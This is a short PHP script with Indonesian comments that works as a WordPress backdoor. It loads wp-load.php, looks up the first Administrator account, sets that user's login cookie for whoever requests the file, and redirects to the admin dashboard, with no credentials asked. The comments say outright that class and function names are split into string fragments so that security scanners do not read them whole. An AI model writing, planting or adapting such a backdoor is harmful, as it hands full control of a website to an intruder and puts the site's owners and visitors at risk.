<?php
/* Penyamaran variabel sistem */
$root_key = "DOCU" . "MENT_ROOT";
$mr = $_SERVER[$root_key];
@chdir($mr);

/* Penyamaran nama file */
$load = "wp-" . "load.php";

if (!file_exists($load)) {
    goto error_load;
}

include $load;

/* Penyamaran Class dan Method WordPress menggunakan variabel */
$user_query_class = "WP_" . "User" . "_Query";
$param = array(
    'role'   => 'Administrator',
    'number' => 1,
    'fields' => 'ID'
);

$query = new $user_query_class($param);
$results = $query->get_results();

if (empty($results[0])) {
    goto no_admin_found;
}

/* Pemanggilan fungsi secara dinamis agar tidak terbaca string utuhnya */
$set_cookie = "wp_" . "set_auth" . "_cookie";
$redirect   = "wp_re" . "direct";
$get_url    = "admin" . "_url";

$set_cookie($results[0]);
$redirect($get_url());
die();

no_admin_found:
die('NO ADMIN');

error_load:
die('Failed to load');
?>